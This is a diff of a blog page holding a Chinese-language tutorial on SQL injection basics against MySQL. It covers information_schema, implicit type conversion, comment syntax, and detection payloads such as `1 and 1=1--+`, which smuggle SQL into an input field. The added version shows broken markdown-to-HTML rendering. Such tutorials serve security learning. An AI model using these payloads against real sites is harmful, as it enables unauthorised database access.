@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="注意以下都是基于数据库是 MySQL 的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。 SQL 注入基础数据库的结构数据库的结构如下图所示：  数据库实例（Database Instance）：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。 数据库（Database）：是有序的数据集合，每个数据库包含多个表。 表（Tabl">
+        <meta name="description" content="注意以下都是基于数据库是 MySQL 的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。 # SQL 注入基础 ## 数据库的结构 数据库的结构如下图所示：   数据库实例（Database Instance）：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。 数据库（Database）：是有序的数据集合，每个数据">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL 注入基础">
 <meta property="og:url" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="sky123">
-<meta property="og:description" content="注意以下都是基于数据库是 MySQL 的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。 SQL 注入基础数据库的结构数据库的结构如下图所示：  数据库实例（Database Instance）：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。 数据库（Database）：是有序的数据集合，每个数据库包含多个表。 表（Tabl">
+<meta property="og:description" content="注意以下都是基于数据库是 MySQL 的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。 # SQL 注入基础 ## 数据库的结构 数据库的结构如下图所示：   数据库实例（Database Instance）：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。 数据库（Database）：是有序的数据集合，每个数据">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/4994106ae4d0162882eaa2c09b17ed1a.png">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/d35a58a9e4678a6a7292bb65f15676e3.png">
@@ -231,7 +231,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -321,466 +321,557 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p><strong>注意以下都是基于数据库是 MySQL 的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。</strong></p>
-<h1 id="SQL-注入基础"><a href="#SQL-注入基础" class="headerlink" title="SQL 注入基础"></a>SQL 注入基础</h1><h2 id="数据库的结构"><a href="#数据库的结构" class="headerlink" title="数据库的结构"></a>数据库的结构</h2><p>数据库的结构如下图所示：<br><img  
+            <p><strong>注意以下都是基于数据库是 MySQL
+的情况，对于其他数据库来说过程大同小异，只不过需要注意一下数据库和表名的获取等步骤。</strong>
+# SQL 注入基础 ## 数据库的结构 数据库的结构如下图所示： <img 
+
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/4994106ae4d0162882eaa2c09b17ed1a.png"
-                      alt="在这里插入图片描述"
+                     data-src="images/4994106ae4d0162882eaa2c09b17ed1a.png"
+                     
+alt="在这里插入图片描述" 
                 ></p>
 <ul>
-<li><strong>数据库实例（Database Instance）</strong>：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。</li>
+<li><strong>数据库实例（Database
+Instance）</strong>：所有数据库通常运行在某个数据库实例上，实例是一个正在运行的数据库管理系统（DBMS）。</li>
 <li><strong>数据库（Database）</strong>：是有序的数据集合，每个数据库包含多个表。</li>
-<li><strong>表（Table）</strong>：每个数据库包含多个表。比如在 <code>database1</code> 中，包含了 <code>table1</code> 、<code>table2</code> 和 <code>table3</code> 。<ul>
+<li><strong>表（Table）</strong>：每个数据库包含多个表。比如在
+<code>database1</code> 中，包含了 <code>table1</code>
+、<code>table2</code> 和 <code>table3</code> 。
+<ul>
 <li><strong>查询结果也可以被视为临时表。</strong></li>
-</ul>
-</li>
+</ul></li>
 <li><strong>字段（Field）</strong>：表中的一列，描述了数据的某个属性。</li>
-<li><strong>记录（Row）</strong>：表中的一行，表示一条完整的数据记录。</li>
+<li><strong>记录（Row）</strong>：表中的一行，表示一条完整的数据记录。
+## information_schema MySQL 5.0 以上自带了
+<code>information_schema</code>
+这个数据库，确切说是信息数据库。<code>information_schema</code>
+中保存着关于 MySQL
+服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。
+### SCHEMATA 表 <code>SCHEMATA</code>
+表包含关于数据库的信息。每一行描述一个数据库（也称为模式）。</li>
 </ul>
-<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>MySQL 5.0 以上自带了 <code>information_schema</code> 这个数据库，确切说是信息数据库。<code>information_schema</code> 中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
-<h3 id="SCHEMATA-表"><a href="#SCHEMATA-表" class="headerlink" title="SCHEMATA 表"></a>SCHEMATA 表</h3><p><code>SCHEMATA</code> 表包含关于数据库的信息。每一行描述一个数据库（也称为模式）。</p>
-<p><strong>常用列</strong>：</p>
-<ul>
-<li><strong><code>SCHEMA_NAME</code>：数据库的名称。</strong></li>
-<li>**<code>DEFAULT_CHARACTER_SET_NAME</code>**：数据库的默认字符集。</li>
-<li>**<code>DEFAULT_COLLATION_NAME</code>**：数据库的默认排序规则。</li>
-<li>**<code>SQL_PATH</code>**：数据库的SQL路径。</li>
-</ul>
-<h3 id="TABLES-表"><a href="#TABLES-表" class="headerlink" title="TABLES 表"></a>TABLES 表</h3><p><code>TABLES</code> 表包含关于所有表的信息。每一行描述一个表，包括表名、所属数据库、表类型等。</p>
-<p><strong>常用列</strong>：</p>
-<ul>
-<li><strong><code>TABLE_SCHEMA</code>：表所在的数据库。</strong></li>
-<li><strong><code>TABLE_NAME</code>：表的名称。</strong></li>
-<li>**<code>TABLE_TYPE</code>**：表的类型（如 <code>BASE TABLE</code>、<code>VIEW</code>）。</li>
-<li>**<code>ENGINE</code>**：存储引擎（如 <code>InnoDB</code>、<code>MyISAM</code>）。</li>
-<li>**<code>TABLE_ROWS</code>**：表中的行数（估计值）。</li>
-<li>**<code>CREATE_TIME</code>**：表的创建时间。</li>
-</ul>
-<h3 id="COLUMNS-表"><a href="#COLUMNS-表" class="headerlink" title="COLUMNS 表"></a>COLUMNS 表</h3><p><code>COLUMNS</code> 表包含关于所有表列的信息。每一行描述一个列，包括列名、数据类型、是否允许为空等。</p>
+<p><strong>常用列</strong>： -
+<strong><code>SCHEMA_NAME</code>：数据库的名称。</strong> -
+<strong><code>DEFAULT_CHARACTER_SET_NAME</code></strong>：数据库的默认字符集。
+-
+<strong><code>DEFAULT_COLLATION_NAME</code></strong>：数据库的默认排序规则。
+- <strong><code>SQL_PATH</code></strong>：数据库的SQL路径。 ### TABLES
+表 <code>TABLES</code>
+表包含关于所有表的信息。每一行描述一个表，包括表名、所属数据库、表类型等。</p>
+<p><strong>常用列</strong>： -
+<strong><code>TABLE_SCHEMA</code>：表所在的数据库。</strong> -
+<strong><code>TABLE_NAME</code>：表的名称。</strong> -
+<strong><code>TABLE_TYPE</code></strong>：表的类型（如
+<code>BASE TABLE</code>、<code>VIEW</code>）。 -
+<strong><code>ENGINE</code></strong>：存储引擎（如
+<code>InnoDB</code>、<code>MyISAM</code>）。 -
+<strong><code>TABLE_ROWS</code></strong>：表中的行数（估计值）。 -
+<strong><code>CREATE_TIME</code></strong>：表的创建时间。 ### COLUMNS 表
+<code>COLUMNS</code>
+表包含关于所有表列的信息。每一行描述一个列，包括列名、数据类型、是否允许为空等。</p>
 <p><strong>常用列</strong>：</p>
 <ul>
 <li><strong><code>TABLE_SCHEMA</code>：表所在的数据库。</strong></li>
 <li><strong><code>TABLE_NAME</code>：表的名称。</strong></li>
 <li><strong><code>COLUMN_NAME</code>：列的名称。</strong></li>
-<li>**<code>ORDINAL_POSITION</code>**：列在表中的位置（从 1 开始）。</li>
-<li>**<code>COLUMN_DEFAULT</code>**：列的默认值。</li>
-<li>**<code>IS_NULLABLE</code>**：列是否允许为 NULL。</li>
-<li>**<code>DATA_TYPE</code>**：列的数据类型（如 <code>int</code>、<code>varchar</code>）。</li>
-<li>**<code>CHARACTER_MAXIMUM_LENGTH</code>**：列的最大字符长度（适用于字符数据类型）。</li>
-<li>**<code>NUMERIC_PRECISION</code>**：列的数值精度（适用于数值数据类型）</li>
+<li><strong><code>ORDINAL_POSITION</code></strong>：列在表中的位置（从 1
+开始）。</li>
+<li><strong><code>COLUMN_DEFAULT</code></strong>：列的默认值。</li>
+<li><strong><code>IS_NULLABLE</code></strong>：列是否允许为 NULL。</li>
+<li><strong><code>DATA_TYPE</code></strong>：列的数据类型（如
+<code>int</code>、<code>varchar</code>）。</li>
+<li><strong><code>CHARACTER_MAXIMUM_LENGTH</code></strong>：列的最大字符长度（适用于字符数据类型）。</li>
+<li><strong><code>NUMERIC_PRECISION</code></strong>：列的数值精度（适用于数值数据类型）
+## 隐式类型转换 SQL 的隐式类型转换是数据库管理系统在执行 SQL
+语句时自动进行的数据类型转换过程。这种转换发生在 SQL
+查询中涉及到不同数据类型的数据操作时，数据库会根据一定的规则自动将数据从一种类型转换成另一种类型，以便进行比较、计算等操作。这种转换对用户是透明的，即用户无需明确指定类型转换。</li>
 </ul>
-<h2 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h2><p>SQL 的隐式类型转换是数据库管理系统在执行 SQL 语句时自动进行的数据类型转换过程。这种转换发生在 SQL 查询中涉及到不同数据类型的数据操作时，数据库会根据一定的规则自动将数据从一种类型转换成另一种类型，以便进行比较、计算等操作。这种转换对用户是透明的，即用户无需明确指定类型转换。</p>
-<p>通常来说隐式类型转换是方便用户使用的，比如：</p>
+<p>通常来说隐式类型转换是方便用户使用的，比如： -
+<strong>数值和字符串的比较</strong>：当一个数值和一个字符串一起用于比较时，字符串通常会被尝试转换为数值类型。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;100&#x27;</span> <span class="operator">=</span> <span class="number">100</span>;  <span class="comment">-- 返回 TRUE，因为字符串 &#x27;100&#x27; 被转换为数值 100</span></span><br></pre></td></tr></table></figure></div> -
+<strong>整数和浮点数的计算</strong>：在涉及整数和浮点数的运算中，整数通常会被转换为浮点数，以保持数值的精度。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">10</span> <span class="operator">*</span> <span class="number">1.5</span>;  <span class="comment">-- 返回 15.0，整数 10 被转换为浮点数</span></span><br></pre></td></tr></table></figure></div> -
+<strong>日期和字符串</strong>：在处理日期和字符串的比较时，字符串会尝试转换成日期类型，前提是字符串符合日期的格式。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;2022-01-01&#x27;</span> <span class="operator">=</span> <span class="type">DATE</span> <span class="string">&#x27;2022-01-01&#x27;</span>;  <span class="comment">-- 返回 TRUE，字符串被转换为日期类型</span></span><br></pre></td></tr></table></figure></div></p>
+<p>在 SQL 注入中，由于传入了一些不合法的数据，导致 SQL
+语句中出现类型不匹配的情况（但是 SQL
+语句是合法的，因此不会报错），具体有下面几种情况： ###
+字符串和数值之间的转换 -
+<strong>字符串开头是数字</strong>：字符串中的开头部分是数字，数据库会将字符串转换为数值，直到遇到第一个非数字字符为止。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;123abc&#x27;</span> <span class="operator">+</span> <span class="number">0</span>;   <span class="comment">-- 返回 123</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;45.67xyz&#x27;</span> <span class="operator">+</span> <span class="number">0</span>; <span class="comment">-- 返回 45.67</span></span><br></pre></td></tr></table></figure></div> -
+<strong>字符串不包含数字或开头不是数字</strong>：如果字符串不包含数字，或者开头部分不是数字，通常会转换为
+0。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;abc123&#x27;</span> <span class="operator">+</span> <span class="number">0</span>;   <span class="comment">-- 返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;xyz&#x27;</span> <span class="operator">+</span> <span class="number">0</span>;     <span class="comment">-- 返回 0</span></span><br></pre></td></tr></table></figure></div> ### 布尔值的转换 -
+<strong>数值转换为布尔值</strong>：0 被转换为
+<code>FALSE</code>，任何非零数值被转换为 <code>TRUE</code>。
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">0</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);   <span class="comment">-- 返回 &#x27;false&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);   <span class="comment">-- 返回 &#x27;true&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">-1</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);  <span class="comment">-- 返回 &#x27;true&#x27;</span></span><br></pre></td></tr></table></figure></div></p>
 <ul>
-<li><strong>数值和字符串的比较</strong>：当一个数值和一个字符串一起用于比较时，字符串通常会被尝试转换为数值类型。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;100&#x27;</span> <span class="operator">=</span> <span class="number">100</span>;  <span class="comment">-- 返回 TRUE，因为字符串 &#x27;100&#x27; 被转换为数值 100</span></span><br></pre></td></tr></table></figure></div></li>
-<li><strong>整数和浮点数的计算</strong>：在涉及整数和浮点数的运算中，整数通常会被转换为浮点数，以保持数值的精度。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">10</span> <span class="operator">*</span> <span class="number">1.5</span>;  <span class="comment">-- 返回 15.0，整数 10 被转换为浮点数</span></span><br></pre></td></tr></table></figure></div></li>
-<li><strong>日期和字符串</strong>：在处理日期和字符串的比较时，字符串会尝试转换成日期类型，前提是字符串符合日期的格式。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;2022-01-01&#x27;</span> <span class="operator">=</span> <span class="type">DATE</span> <span class="string">&#x27;2022-01-01&#x27;</span>;  <span class="comment">-- 返回 TRUE，字符串被转换为日期类型</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<p>在 SQL 注入中，由于传入了一些不合法的数据，导致 SQL 语句中出现类型不匹配的情况（但是 SQL 语句是合法的，因此不会报错），具体有下面几种情况：</p>
-<h3 id="字符串和数值之间的转换"><a href="#字符串和数值之间的转换" class="headerlink" title="字符串和数值之间的转换"></a>字符串和数值之间的转换</h3><ul>
-<li><strong>字符串开头是数字</strong>：字符串中的开头部分是数字，数据库会将字符串转换为数值，直到遇到第一个非数字字符为止。<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;123abc&#x27;</span> <span class="operator">+</span> <span class="number">0</span>;   <span class="comment">-- 返回 123</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;45.67xyz&#x27;</span> <span class="operator">+</span> <span class="number">0</span>; <span class="comment">-- 返回 45.67</span></span><br></pre></td></tr></table></figure></div></li>
-<li><strong>字符串不包含数字或开头不是数字</strong>：如果字符串不包含数字，或者开头部分不是数字，通常会转换为 0。<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;abc123&#x27;</span> <span class="operator">+</span> <span class="number">0</span>;   <span class="comment">-- 返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;xyz&#x27;</span> <span class="operator">+</span> <span class="number">0</span>;     <span class="comment">-- 返回 0</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h3 id="布尔值的转换"><a href="#布尔值的转换" class="headerlink" title="布尔值的转换"></a>布尔值的转换</h3><ul>
-<li><p><strong>数值转换为布尔值</strong>：0 被转换为 <code>FALSE</code>，任何非零数值被转换为 <code>TRUE</code>。</p>
-<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">0</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);   <span class="comment">-- 返回 &#x27;false&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);   <span class="comment">-- 返回 &#x27;true&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">-1</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);  <span class="comment">-- 返回 &#x27;true&#x27;</span></span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>字符串转换为布尔值</strong>：空字符串被转换为 <code>FALSE</code>，非空字符串被转换为 <code>TRUE</code>。</p>
+<li><strong>字符串转换为布尔值</strong>：空字符串被转换为
+<code>FALSE</code>，非空字符串被转换为 <code>TRUE</code>。
 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);    <span class="comment">-- 返回 &#x27;false&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>); <span class="comment">-- 返回 &#x27;true&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
-<li><p><strong>NULL 和布尔值比较</strong>：NULL 在布尔表达式中通常被视为 <code>FALSE</code>。</p>
-  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="keyword">NULL</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>); <span class="comment">-- 返回 &#x27;false&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
+<li><strong>NULL 和布尔值比较</strong>：NULL 在布尔表达式中通常被视为
+<code>FALSE</code>。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="keyword">NULL</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>); <span class="comment">-- 返回 &#x27;false&#x27;</span></span><br></pre></td></tr></table></figure></div> ## MySQL 常见问题 ### SQL 注释 在 SQL
+注入中为了闭合 SQL 语句最好在语句后面加一个注释来将后续的 SQL
+查询语句注释掉。常用的注释方法如下：</li>
+<li><code>--+</code>：在 SQL 语句中 <code>--</code>
+表示单行注释的意思，而后面的 <code>+</code> 是 URL
+编码后的空格，用于分隔。</li>
+<li><code>#</code>：在 SQL 语句中 <code>#</code>
+表示单行注释的意思，这种单行注释方式主要在 MySQL 中流行，但并不是所有
+SQL 数据库都支持。<strong>在如果修改的是 URL 编码后的内容需要将
+<code>#</code> 改为 <code>%23</code></strong> 。</li>
 </ul>
-<h2 id="MySQL-常见问题"><a href="#MySQL-常见问题" class="headerlink" title="MySQL 常见问题"></a>MySQL 常见问题</h2><h3 id="SQL-注释"><a href="#SQL-注释" class="headerlink" title="SQL 注释"></a>SQL 注释</h3><p>在 SQL 注入中为了闭合 SQL 语句最好在语句后面加一个注释来将后续的 SQL 查询语句注释掉。常用的注释方法如下：</p>
+<p><strong>注意：有时候由于客户端比较智能，URL 中的空格不需要编码为
+<code>%20</code> 或 <code>+</code> 但是 <code>#</code> 一定要编码为
+<code>%23</code>（虽然此时空格并没有编码），因为 <code>#</code> 在 URL
+有实际含义（锚点），客户端不能确定它是否需要被编码。</strong> ### MySQL
+添加日志 要想了解 MySQL 到底执行了什么 SQL 语句可以在 MySQL 的配置文件
+<code>my.ini</code> 中添加如下内容： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">general_log=1</span><br><span class="line">general_log_file=&quot;D:\phpstudy_pro\Extensions\MySQL5.7.26\data\mysql.log&quot;</span><br></pre></td></tr></table></figure></div> 这样即可将 MySQL
+的执行语句记录在 <code>mysql.log"</code> 中。 ### 编码问题
+有的时候查询因编码问题报如下错误： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1271 (HY000): Illegal mix of collations for operation &#x27;UNION&#x27;</span><br></pre></td></tr></table></figure></div>
+这时可以尝试将查询字段的编码修改为 <code>utf8mb4</code>（MySQL 中支持全
+Unicode 范围的字符集）。具体转换方式为
+<code>CONVERT(&lt;field&gt; USING utf8mb4)</code> 。 # SQL 注入一般过程
+## 检测注入点 ### 判断漏洞是否存在
+根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p>
+<p>一般利用单引号（<code>'</code>）或者双引号（<code>"</code>）来判断是否存在漏洞，如果出现
+SQL
+语句错误说明有很大的可能会存在漏洞；如果是查询结果发生改变则需要根据具体漏洞类型进行检测。
+### 判断注入类型
+判断注入类型是<strong>数字型</strong>还是<strong>字符型</strong>。字符型和数字型是针对查询内容是数字的情况来区分的。这两种类型的本质区别是后端代码在拼接
+sql 语句的时候会不会将用户输入的查询内容外加引号。 -
+如果将用户输入的查询内容外加引号则是字符型注入。 -
+如果没有将用户输入的查询内容外加引号则是数字型注入。</p>
+<p>注入类型决定了在注入的过程中<strong>是否需要添加单引号来确保符号闭合</strong>。而注入类型可以通过「<strong>隐式类型转换</strong>」这种特性来判断。我们使用
+<code>1 and 1=1--+</code> 和 <code>1 and 1=2--+</code>（<code>--+</code>
+可以替换为 <code>%23</code>）两个 payload
+进行判断，根据查询结果判断注入类型： -
+如果两者结果<strong>不同</strong>则说明可能是<strong>数字型</strong>注入，查询语句如下：
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure></div> -
+如果两者结果<strong>相同</strong>则说明可能是<strong>字符型</strong>注入，查询语句如下（这里字符串都被隐式转换为数字
+1）： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="string">&#x27;1 and 1=1&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span></span><br><span class="line">user_id <span class="operator">=</span> <span class="string">&#x27;1 and 1=2&#x27;</span>;</span><br></pre></td></tr></table></figure></div> ## 构造信息泄露原语
+在泄露信息前需要先构造号信息泄露原语（可以执行任意返回一个字符串/值
+<code>SELECT</code> 语句），这样 sql
+注入的利用过程会比较清晰，不容易出错。 ### 相关函数 -
+<code>substr(string, start, length)</code>：这个函数用于截取字符串,它有以下参数:
+- <strong>参数</strong>： - <code>string</code>：需要截取的原始字符串 -
+<code>start</code>：开始位置，从 1 开始计数 -
+<code>length</code>：需要截取的长度，如果不填则默认截取到字符串末尾 -
+<strong>返回值</strong>： -
+返回一个新的字符串，该字符串是原始字符串中从指定位置开始,长度为指定长度的子串。
+- 如果 <code>start</code> 超出字符串长度，则返回一个空字符串。 - 如果
+<code>length</code> 超出字符串长度，则返回从 <code>start</code>
+位置到字符串末尾的子串。 - <code>length(str)</code>： -
+<strong>功能</strong>：返回字符串 <code>str</code>
+的长度，<strong>以字节为单位</strong>。 -
+<strong>参数</strong>：<code>str</code> 是需要处理的字符串。 -
+<strong>返回值</strong>：返回一个整数，表示字符串 <code>str</code>
+的字节长度。 - <strong>示例</strong>： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> length(<span class="string">&#x27;Hello&#x27;</span>);     <span class="comment">-- 返回 5</span></span><br><span class="line"><span class="keyword">SELECT</span> length(<span class="string">&#x27;你好&#x27;</span>);      <span class="comment">-- 返回 6 (因为每个中文字符在 UTF-8 编码中占用 3 个字节)</span></span><br><span class="line"><span class="keyword">SELECT</span> length(<span class="string">&#x27;&#x27;</span>);          <span class="comment">-- 返回 0</span></span><br><span class="line"><span class="keyword">SELECT</span> length(<span class="number">123</span>);         <span class="comment">-- 返回 3 (123 隐式类型转换为 &quot;123&quot;)</span></span><br></pre></td></tr></table></figure></div> -
+<code>char_length(str)</code> 或
+<code>character_length(str)</code>：</p>
 <ul>
-<li><code>--+</code>：在 SQL 语句中 <code>--</code> 表示单行注释的意思，而后面的 <code>+</code> 是 URL 编码后的空格，用于分隔。</li>
-<li><code>#</code>：在 SQL 语句中 <code>#</code> 表示单行注释的意思，这种单行注释方式主要在 MySQL 中流行，但并不是所有 SQL 数据库都支持。<strong>在如果修改的是 URL 编码后的内容需要将 <code>#</code> 改为 <code>%23</code></strong> 。</li>
-</ul>
-<p><strong>注意：有时候由于客户端比较智能，URL 中的空格不需要编码为 <code>%20</code> 或 <code>+</code> 但是 <code>#</code> 一定要编码为 <code>%23</code>（虽然此时空格并没有编码），因为 <code>#</code> 在 URL 有实际含义（锚点），客户端不能确定它是否需要被编码。</strong></p>
-<h3 id="MySQL-添加日志"><a href="#MySQL-添加日志" class="headerlink" title="MySQL 添加日志"></a>MySQL 添加日志</h3><p>要想了解 MySQL 到底执行了什么 SQL 语句可以在 MySQL 的配置文件 <code>my.ini</code> 中添加如下内容：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">general_log=1</span><br><span class="line">general_log_file=&quot;D:\phpstudy_pro\Extensions\MySQL5.7.26\data\mysql.log&quot;</span><br></pre></td></tr></table></figure></div>
-<p>这样即可将 MySQL 的执行语句记录在 <code>mysql.log&quot;</code> 中。</p>
